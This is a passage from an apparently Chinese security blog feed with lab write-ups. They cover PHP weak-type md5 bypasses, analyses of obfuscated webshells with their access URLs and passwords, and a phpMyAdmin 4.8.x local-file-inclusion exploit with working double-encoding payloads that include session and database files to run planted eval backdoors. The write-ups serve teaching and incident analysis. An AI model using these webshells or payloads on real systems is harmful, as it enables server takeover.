target="_blank" rel="external">mixed</a> <strong>eval</strong> ( string <code>$code</code> ) </p><p><strong>Note</strong>: 因为是一个语言构造器而不是一个函数，不能被 <a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a> 调用。 </p></blockquote><h3 id="0x01-第二题"><a href="#0x01-第二题" class="headerlink" title="0x01 第二题"></a>0x01 第二题</h3><h4 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h4><p>根据提供的源代码，分析找出认证码，审计源代码，需要找一个值，这个值的md5值在php中==题中给定值的md5值</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809290917_642.png" alt=""></p><p>下载源代码，审计</p><pre><code class="php">&lt;?phperror_reporting(0);$a1 = md5(&#39;QNKCDZO&#39;);$a = @$_POST[&#39;pass&#39;];$a2 = @md5($a);if(isset($a)){    if ($a != &#39;QNKCDZO&#39; &amp;&amp; $a1 == $a2) {        /**        内容省略！         **/        exit();    } else {        echo &#39;&lt;script&gt;alert(\&#39;认证错误\&#39;);window.location.href=\&#39;/index.html\&#39;;&lt;/script&gt;&#39;;    }}?&gt;</code></pre><p>这里有很明显的问题，密码是以MD5方式保存，只要找到一个QNKCDZO的md5值相同的密码就可以通过，或者php是弱类型语言，在使用 == 号时，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行</p><pre><code>md5(&#39;240610708&#39;) 的结果是：0e462097431906509019562988736854md5(&#39;QNKCDZO&#39;) 的结果是：0e830400451993494058024219903391</code></pre><p> 0e 的科学记数法开头，字符串被隐式转换为浮点数，实际上也就等效于 0，所以为0，相等。</p><p>输入240610708</p><p>KEY:<br>mozhe454234355b0307eea24ed161701</p><h3 id="0x02-第三题"><a href="#0x02-第三题" class="headerlink" title="0x02 第三题"></a>0x02 第三题</h3><h4 id="背景-2"><a href="#背景-2" class="headerlink" title="背景"></a>背景</h4><p>某公司雇佣你对一个登陆界面进行测试，你只能得到源码，需要审计这段源码，找出其漏洞并成功登陆</p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809290930_375.png" alt=""></p><p>下载源代码，审计</p><pre><code class="php">&lt;?phperror_reporting(0); function noother_says_correct($number) {     $one = ord(&#39;1&#39;);     $nine = ord(&#39;9&#39;);     for ($i = 0; $i &lt; strlen($number); $i++)     {         $digit = ord($number{$i});         if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )         {             return false;         }     }     return $number == &#39;54975581388&#39;; }if(noother_says_correct($_POST[&#39;pass&#39;])){    /**    此处省略     **/} else{    echo &#39;&lt;script&gt;alert(\&#39;认证错误\&#39;);window.location.href=\&#39;/index.html\&#39;;&lt;/script&gt;&#39;;}?&gt;</code></pre><p>分析代码：</p><p>1.在for 循环中是判断输入的字符是否有存在在1和9之间的数字</p><p>2.如果不存在判断是否等于54975581388</p><p>3.等于就可以绕过</p><p>4..php弱类型考点<code>$a == $b</code>等于<strong>TRUE</strong> 如果类型转换后<code>$a</code>等于<code>$b</code>，php在转码时会把16进制转化为十进制，将54975581388转成16进制，0xccccccccc。</p><p>KEY: mozhe8466fa038dd9ad4c4934892d6b7</p><h2 id="二、WebShell代码分析溯源全解析"><a href="#二、WebShell代码分析溯源全解析" class="headerlink" title="二、WebShell代码分析溯源全解析"></a>二、WebShell代码分析溯源全解析</h2><h3 id="0x00-第一题"><a href="#0x00-第一题" class="headerlink" title="0x00 第一题"></a>0x00 第一题</h3><h4 id="背景-3"><a href="#背景-3" class="headerlink" title="背景"></a>背景</h4><p>某系统环境上发现一个可疑文件，请协助运维人员分析此文件的功能。</p><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809271427_84.png" alt=""></p><p> 下载系统源码 ，发现在cn-right.php文件中存在webshell</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809271435_300.png" alt=""></p><pre><code class="php">&lt;?phperror_reporting(0);$_GET[&#39;POST&#39;]($_POST[&#39;GET&#39;]);?&gt;</code></pre><p>这里分析一下webshell代码，用GET和POST函数就构成了木马，</p><p>方法一：</p><p><a href="http://219.153.49.228:40568/www/cn-right.php?POST=assert" target="_blank" rel="external">http://219.153.49.228:40568/www/cn-right.php?POST=assert</a></p><p>GET=${fputs(fopen(base64_decode(bWFuZzAucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUWydtYW5nMCddKTsgPz4=))}</p><p>执行后当前目录生成mang0.php一句话木马，密码为 mang0</p><p>方法二：</p><p>客户端用菜刀，密码GET，url为<a href="http://219.153.49.228:40568/www/cn-right.php?POST=assert" target="_blank" rel="external">http://219.153.49.228:40568/www/cn-right.php?POST=assert</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809291005_963.png" alt=""></p><p>mozhe3dbde397de25960e10f5d997a47</p><h3 id="0x01-第二题-1"><a href="#0x01-第二题-1" class="headerlink" title="0x01 第二题"></a>0x01 第二题</h3><h4 id="背景-4"><a href="#背景-4" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281233_867.png" alt=""></p><p>下载系统源码，在index.php存在恶意代码</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281248_425.png" alt=""></p><pre><code class="php">&lt;?php     $POST[&#39;POST&#39;]=&#39;assert&#39;;    $array[]=$POST;    $array[0][&#39;POST&#39;]($_POST[&#39;assert&#39;]);?&gt;</code></pre><p>这里分析一下webshell代码：</p><p>assert，是php代码执行函数，与eval()有同样的功能，因为<code>$array[],POST[]</code>都是数组，所以<code>$array[]=$POST</code>，就是把<code>$POST</code>数组的值赋给<code>$array</code>数组，这样的话<code>$array[0][&#39;POST&#39;]</code>的输出就是assert，所以组成了一句话木马<code>&lt;?php assert($_POST[&#39;assert&#39;]);?&gt;</code>直接用菜刀链接即可密码为assert。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281310_877.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281310_426.png" alt=""></p><p>mozheb1315766f73e9fe22e58b67c107</p><h3 id="0x02-第三题-1"><a href="#0x02-第三题-1" class="headerlink" title="0x02 第三题"></a>0x02 第三题</h3><h4 id="背景-5"><a href="#背景-5" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281620_62.png" alt=""></p><p>下载系统源码，</p><pre><code class="php">查看所有php后缀文件$ag -g . --phpindex.php js/jquery1.42.min.php includes/class-IXR-clientmulticall.php includes/class-IXR-date.php includes/class-IXR-client.php includes/class-IXR-base64.php</code></pre><p>在jquery1.42.min.php存在恶意代码</p><p>D盾查杀也找到对应的文件。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281617_574.png" alt=""></p><pre><code class="php">&lt;?phperror_reporting(0);$g = array(&#39;&#39;,&#39;s&#39;);$gg = a.$g[1].ser.chr(&#39;116&#39;);@$gg($_POST[get]);?&gt;</code></pre><p>这里分析一下webshell代码：</p><p>php中“.”表示将前后单位以字符串形式拼接</p><p>数组g[1]=s, char(116)是t ，gg连起来就是assert</p><p>整个一句话为<code>@$assert($_POST(get))</code></p><p><a href="http://219.153.49.228:47270/www/js/jquery1.42.min.php" target="_blank" rel="external">http://219.153.49.228:47270/www/js/jquery1.42.min.php</a>  密码get</p><p>中国菜刀连接</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281629_99.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281629_506.png" alt=""></p><p>mozhebfb0dc9d53ee0aea51d557142fe</p><h3 id="0x03-第四题"><a href="#0x03-第四题" class="headerlink" title="0x03 第四题"></a>0x03 第四题</h3><h4 id="背景-6"><a href="#背景-6" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281638_331.png" alt=""></p><p> 下载系统源码，在index.php存在恶意代码</p><pre><code class="php">&lt;?phperror_reporting(0);$e=$_REQUEST[&#39;e&#39;];$arr=array($_POST[&#39;POST&#39;],);array_filter($arr,base64_decode($e));?&gt;</code></pre><p>这里分析一下webshell代码：</p><p>1、发现使用回调函数，各函数解释如下：<br>    ①、<code>$_REQUEST[]</code>,HTTP Request 变量,默认情况下包含了 <code>$_GET，$_POST 和 $_COOKIE</code> 的数组。<br>    ②、array_filter()回调函数,原型为：</p><p><code>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</code></p><pre><code>       依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。③base64_decode(),对 base64 编码的 data 进行解码。返回原始数据， 或者在失败时返回 FALSE。返回的数据可能是二进制的。</code></pre><p>2、整理后，最终shell代码为</p><p><code>base64_decode($_REQUEST[&#39;e&#39;])(​$_POST[&#39;POST&#39;]);</code></p><p>3、构造assert函数，使用$e参数传递经过base64编码后的assert字符串</p><p><a href="http://219.153.49.228:48776/www/hack/bin.php?e=YXNzZXJ0" target="_blank" rel="external">http://219.153.49.228:48776/www/hack/bin.php?e=YXNzZXJ0</a> 密码POST</p><p>YXNzZXJ0用base64解码的结果是assert  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281704_36.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281711_538.png" alt=""></p><p>mozhe29055fb55f5c3cae9d29040f187</p><h3 id="0x04-第五题"><a href="#0x04-第五题" class="headerlink" title="0x04 第五题"></a>0x04 第五题</h3><h4 id="背景-7"><a href="#背景-7" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281724_18.png" alt=""></p><p> 下载系统源码，在Exception.php存在恶意代码</p><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281733_804.png" alt=""></p><pre><code class="php">error_reporting(0);call_user_func(&#39;assert&#39;, $_REQUEST[&#39;assert&#39;]);</code></pre><p>这里分析一下webshell代码：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281727_700.png" alt=""></p><p>整理后shell代码为：assert($_REQUEST[‘assert’]);</p><p><a href="http://http://219.153.49.228:47037/www/Exception.php密码assert" target="_blank" rel="external">http://http://219.153.49.228:47037/www/Exception.php密码assert</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281729_410.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281731_794.png" alt=""></p><p>mozhed6b28482c826171d5761e39f628</p><h3 id="0x05-第六题"><a href="#0x05-第六题" class="headerlink" title="0x05 第六题"></a>0x05 第六题</h3><h4 id="背景-8"><a href="#背景-8" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281737_575.png" alt=""></p><p> 下载系统源码，在index.php存在恶意代码</p><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281738_988.png" alt=""></p><pre><code class="php">&lt;?phperror_reporting(0);$e = $_REQUEST[&#39;e&#39;];$arr = array($_POST[&#39;POST&#39;],);array_map(base64_decode($e), $arr);?&gt;</code></pre><p>这里分析一下webshell代码：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281739_94.png" alt=""></p><p>构造参数e为经过base64加密后的assert字符串，这样传递过去的assert()，就会对arr数组中的每一个值进行作用，数组中的每一个值进行作用。</p><p>所以整理后：<code>base64_decode($_REQUEST[&#39;e&#39;])($_POST[&#39;POST&#39;]);</code></p><p><a href="http://219.153.49.228:45692/www/Assets/upload/pic3.jpg.php?e=YXNzZXJ0" target="_blank" rel="external">http://219.153.49.228:45692/www/Assets/upload/pic3.jpg.php?e=YXNzZXJ0</a> 密码 POST</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281744_739.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281743_719.png" alt=""></p><p>mozhea53e1e65c45eae8bbabfca9d30c</p><h3 id="0x06-第七题"><a href="#0x06-第七题" class="headerlink" title="0x06 第七题"></a>0x06 第七题</h3><h4 id="背景-9"><a href="#背景-9" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281749_36.png" alt=""></p><p> 下载系统源码，在random_int.php存在恶意代码</p><pre><code class="php">&lt;?phperror_reporting(0);$e = $_REQUEST[&#39;e&#39;];$arr = array(&#39;test&#39;, $_REQUEST[&#39;POST&#39;]);uasort($arr, base64_decode($e));</code></pre><p>这里分析一下webshell代码：</p><p>uasort: </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282045_325.png" alt=""></p><pre><code>通过base64_decode()函数解密后的函数，对$数组进行排序，通过查看arr数组进行排序，通过查看$arr数组可知，其含有$元素，这里可以知道使用可执行函数，对_REQUEST[&#39;POST&#39;]元素，这里可以知道使用可执行函数，对$arr进行排序时，可执行shell代码。所以shell代码如下：base64_decode($_REQUEST[&#39;e&#39;])$_REQUEST[&#39;POST&#39;];</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281754_26.png" alt=""></p><p>mozhe24bcc5751c5d95d68250bfc8771</p><h3 id="0x07-第八题"><a href="#0x07-第八题" class="headerlink" title="0x07 第八题"></a>0x07 第八题</h3><h4 id="背景-10"><a href="#背景-10" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282050_403.png" alt=""></p><p> 下载系统源码，在\fields\class-wp-rest-comment-meta-style.php存在恶意代码</p><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282056_478.png" alt=""></p><pre><code class="php">$e = $_REQUEST[&#39;e&#39;];$arr = array($_POST[&#39;pass&#39;] =&gt; &#39;|.*|e&#39;,);array_walk($arr, $e, &#39;&#39;);</code></pre><p>这里分析一下webshell代码：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282103_450.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282111_382.png" alt=""></p><p> preg_replace() 将 replacement 参数当作 PHP 代码，正则意思为匹配模式出现/e修正符，后面的replacement就会被当作php代码执行，这样我们就可以把 <code>$_POST[&#39;pass&#39;]</code>运行。</p><p><a href="http://219.153.49.228:40515//www/fields/class-wp-rest-comment-meta-style.php?" target="_blank" rel="external">http://219.153.49.228:40515//www/fields/class-wp-rest-comment-meta-style.php?</a> e=preg_replace 密码为pass</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282102_497.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282058_846.png" alt=""></p><p>mozhe43997bb5d7b5b3546758a4724a2</p><h3 id="0x08-第九题"><a href="#0x08-第九题" class="headerlink" title="0x08 第九题"></a>0x08 第九题</h3><h4 id="背景-11"><a href="#背景-11" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p> 下载系统源码，在\pomo\no.php存在恶意代码</p><pre><code class="php">error_reporting(0);$e = $_REQUEST[&#39;e&#39;];//接收e参数数据register_shutdown_function($e, $_REQUEST[&#39;REQUEST&#39;]); //e传入的assert和Request传入内容作用</code></pre><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282121_797.png" alt=""></p><p>这里分析一下webshell代码：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282122_206.png" alt=""></p><p>PHP中止的情况有三种：</p><ul><li><ul><li>执行完成<ul><li>exit/die导致的中止</li><li>发生致命错误中止    </li></ul></li></ul></li></ul><p>等到php函数执行完成，就会调用我们传进去的php中止时执行的函数，构成 <code>assert($_REQUEST[&#39;REQUEST&#39;])</code> ，一句话木马</p><p><a href="http://219.153.49.228:41312/www/pomo/no.php?e=assert" target="_blank" rel="external">http://219.153.49.228:41312/www/pomo/no.php?e=assert</a></p><p>密码：REQUEST</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282326_573.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282326_19.png" alt=""></p><p>mozhe4694154a7d928a98d6db8a0b267</p><h3 id="0x09-第十题"><a href="#0x09-第十题" class="headerlink" title="0x09 第十题"></a>0x09 第十题</h3><h4 id="背景-12"><a href="#背景-12" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282338_522.png" alt=""></p><p> 下载系统源码，在\hack\static\css.php存在恶意代码</p><pre><code class="php">&lt;?php error_reporting(0); $e = $_REQUEST[&#39;e&#39;]; declare(ticks=1); register_tick_function ($e, $_REQUEST[&#39;GET&#39;]); ?&gt;</code></pre><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282337_894.png" alt=""></p><p>这里分析一下webshell代码：</p><p>register_tick_function函数必须要和declare流程控制机制合并使用,</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282345_79.png" alt=""></p><p>每执行ticks=1行php代码，就执行一次register_tick_function函数中的代码，当e接收assert时就构成了，<code>$_request[&#39;GET&#39;]</code>是参数，这样就构成了<code>assert($_request[&#39;GET&#39;])</code> </p><p><a href="http://219.153.49.228:40102//www/hack/static/css.php?e=assert" target="_blank" rel="external">http://219.153.49.228:40102//www/hack/static/css.php?e=assert</a> 密码:GET</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282340_126.png" alt=""></p><p>mozhe27968c88c7b957576fe9562274e</p><h3 id="0x0a-第十一题"><a href="#0x0a-第十一题" class="headerlink" title="0x0a 第十一题"></a>0x0a 第十一题</h3><h4 id="背景-13"><a href="#背景-13" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282350_310.png" alt=""></p><p> 下载系统源码，在mysql_conn.php存在恶意代码</p><pre><code class="php">&lt;?php if(!empty($_GET[1]) &amp;&amp; $_GET[1]==&#39;GET.fPZ87&#39;){    $_=@fopen(&#39;t.php&#39;, &#39;a&#39;);    @fwrite($_,&quot;&lt;?php \$_=str_replace(&#39;ilo&#39;,&#39;ass&#39;,str_replace(&#39;vey&#39;,&#39;ert&#39;,\$_GET[2]));@\$_(\$_POST[1]);?&gt;&quot;);    @fclose($_);}?&gt;</code></pre><p>这里分析一下webshell代码：</p><p>若get到的1不为空且1=GET.fPZ87的话执行，创建t.php并写入，写入t.php恶意代码，<code>$GET_[2]</code>接收到的值中的vey替换为ert，ilo替换为ass，也是时候当2=ilovey是，构成assert($_POST[1])，密码为1的一句话。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809290908_564.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809290007_111.png" alt=""></p><p>mozhef880344b9cbe7323d3ef241d16a</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;文章首发于&lt;a href=&quot;https://xz.aliyun.com/t/2821&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;先知社区&lt;/a&gt;,转载请注明来源&lt;/p&gt;
&lt;h2 id=&quot;一、PHP代码分析溯源&quot;&gt;&lt;a href=&quot;#一、PHP代码分析溯
      
    
    </summary>
    
      <category term="代码审计" scheme="http://mang0.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://mang0.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>phpMyAdmin 4.8.x 本地文件包含</title>
    <link href="http://mang0.me/archives/767136e1/"/>
    <id>http://mang0.me/archives/767136e1/</id>
    <published>2018-10-27T04:19:37.000Z</published>
    <updated>2018-11-02T14:21:15.676Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-源码分析"><a href="#0x00-源码分析" class="headerlink" title="0x00 源码分析"></a>0x00 源码分析</h2><p>在/index.php     56行：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/f21383d8fef7c3ed9de41992dab112e2.png" alt="img"></p><p>这里的target 可以直接传值输入。我们可以传入一个本地文件路径去让其包含，就会造成LFI漏洞。</p><p>首先，我们满足4个条件：</p><p>1．传入的target 需要是一个字符串。</p><p>2．不能以/index/ 开头。</p><p>3．不能在$target_blacklist数组内。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/052347bd2743c4b4c356996d842359de.png" alt="img"></p><p>4．满足checkPageValidity函数要求。</p><p>跟踪一下checkPageValidity函数</p><p>在/libraries/classes/Core.php  443行:</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/715e352918c11a7e8029bb2d9a897fe6.png" alt="img"></p><p>该函数内，有三处返回ture的地方，只要有任意一处返回ture就可以。观察这三处，有一个共同点，都是需要$page在$whitelist数组中内才会返回true。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/84f51699726302cc72be152d425b380b.png" alt="img"></p><p>我们先看第一个返回true的地方。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/bae25cd9638b29f7e362378fd4bffd41.png" alt="img"></p><p>这里的<code>`$page</code>在in_array之前没有经过任何的修饰，直接就与$whitelist作比较。没有办法绕过，传入的target值只能为白名单里的文件名才行。很明显，第一个并不能利用。</p><p>再来看第二个</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/7b3e77822c7d3ac4142d3725aaa69bb8.png" alt="img"></p><p>先介绍下这些函数的作用：</p><p>mb_strpos()函数的意思是查找字符串在另一个字符串中首次出现的位置。</p><p>mb_substr()函数的意思是：</p><pre><code>string mb_substr ( string $str, int $start [, int $length = NULL [, string $encoding = mb_internal_encoding()]] )</code></pre><p>从$str字符串中，提取从$start位置开始，长度为$length的字符串。</p><p>可以看出，第二个可以返回ture，我们利用db_sql.php?/../../格式就可以达到目的，绕过白名单限制。那是不是这样就可以造成漏洞了呢？</p><p>假设我们用db_sql.php?/../../../aaa.txt来绕过白名单限制进行包含文件。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/7c62ac55d4b22ce97d63800033f14835.png" alt="img"></p><p>那这里就是 include ‘db_sql.php?/../../../aaa.txt’。</p><p>这种格式并不能跨路径包含，因为php程序把？号后面的东西当成是传入db_sql.php文件的参数。</p><p>再来看第三个：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/84beb310c9f8c555ea6fb71e0698f371.png" alt="img"></p><p>第三个和第二个对比多出了个urldecode()函数。</p><p>而问题恰恰出在了这个urldecode()函数。</p><p>我们可以利用双重编码绕过，将?经过两次编码%253f就可以绕过白名单验证。</p><p>原因是：</p><p>%253f 传入时，首先会被自动解码一次，变成%3f。然后urldecode()再解码一次，就变成了 ?。 成功绕过了白名单限制。</p><p>这种情况下include的包含情况就是这样的，也就可以任意包含本地文件了。</p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>1.使用帐号 root ，密码 toor 登录 phpMyAdmin</p><p>2.点击顶部导航栏中的SQL按钮，执行SQL查询</p><pre><code class="sql">select &#39;&lt;?php phpinfo();exit;?&gt;&#39;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/exp_5.png" alt="VulnSpy"></p><ol><li>获取自己的SESSION ID</li></ol><p>你的 SESSION ID 为 Cookie 中的 <code>phpMyAdmin</code> 项。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/exp_6.png" alt="VulnSpy"></p><p>这样对应的SESSION文件为<code>/var/lib/php/sessions/sess_你的SESSION ID</code>。</p><ol><li>包含SESSION文件，成功利用该漏洞</li></ol><pre><code class="bash">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/exp_7.png" alt="VulnSpy"></p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>将WebShell写入到数据库中然后包含数据库文件，这个方法需要写入数据的权限。</p><p>在phpmyadmin中插入马的字段。比如 <code>&lt;?php eval($_GET[a])?&gt;</code></p><p>此时，如果mysql的路径被猜到的话，其实是可以知道该表中所存储的数据的。</p><pre><code class="vim">?a=phpinfo();&amp;target=db_sql.php%253f/../../../../../../../../var/lib/mysql/test/HACK.ibd</code></pre><p>我不知道应该是ibd还是frm文件，但是最终发现这样会出错，猜测可能是字符编码的问题或者是mysql版本的问题。我mysql的版本比较高。可能数据文件不是这么好读取。</p><p>方法二：利用mysql的data文件：</p><p>不用写文件也能拿Shell的方法。</p><p>我们都知道，登入phpmyadmin后，数据库就是完全可以控制的了，那我们是否可以把WebShell写入到数据库中然后包含数据库文件</p><p>创建一个名为abc的表，并且字段设置为</p><pre><code>&lt;?php eval($_GET[‘z’]); ?&gt;。</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/0b17b8f7210a3d7894dca01435cfe609.png" alt="img"></p><p>保存，然后会在\MySQL\data\test目录下生成三个以数据表名命名的文件。（test为数据库名称）。</p><p>如果你不知道data文件路径，可以用sql查询来获取到它的绝对路径。</p><pre><code>show variables like &#39;%datadir%&#39;;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/b071d225a03774b04f057f324a390a17.png" alt="img"></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/2101ec2bbe439ab48a8ac574c16e189e.png" alt="img"></p><p>其中，abc.frm文件内容</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/2debae539b0d4aea4aef11dddf6af7b0.png" alt="img"></p><p>Payload：</p><pre><code>/index.php?z=phpinfo();&amp;target=db_sql.php%253f/../../../../../../../../ruanjian/phpstudy/PHPTutorial/MySQL/data/test/abc.frm</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/bebfd31b0d63a338eee12cda98393928.png" alt="img"></p><p>方法三：包含本地系统文件</p><p>Payload:</p><pre><code>/index.php?target=db_sql.php%253f/../../../../../../windows/system.ini</code></pre><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>参照ChaMd5安全团队发布的文章：<a 